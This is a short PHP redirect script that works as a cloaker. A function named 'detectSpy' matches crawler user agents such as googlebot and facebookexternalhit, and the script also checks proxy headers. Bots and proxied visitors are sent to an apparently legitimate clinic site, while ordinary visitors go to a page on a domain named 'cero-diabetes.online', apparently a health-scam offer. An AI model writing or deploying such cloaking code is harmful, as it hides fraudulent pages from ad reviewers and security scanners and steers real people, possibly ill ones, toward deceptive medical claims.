<?php 

function detectSpy(): bool{
  return (isset($_SERVER['HTTP_USER_AGENT']) && 
  preg_match('/bot|crawl|slurp|spider|mediapartners|facebookexternalhit|facebookcatalog|facebot|googlebot/i', $_SERVER['HTTP_USER_AGENT']));
}
function proxy_detect () {

if(
    $_SERVER['HTTP_FORWARDED']
|| $_SERVER['HTTP_X_FORWARDED_FOR']
|| $_SERVER['HTTP_CLIENT_IP']
|| $_SERVER['HTTP_VIA']
|| $_SERVER['HTTP_XROXY_CONNECTION']
|| $_SERVER['HTTP_PROXY_CONNECTION']
)
{
return true;
}else{
return false;
}
}


if(detectSpy() === true || proxy_detect() === true){
  header("Location: https://www.davila.cl/");
  exit;
}
  header("Location: https://cero-diabetes.online/host.html");
  return;


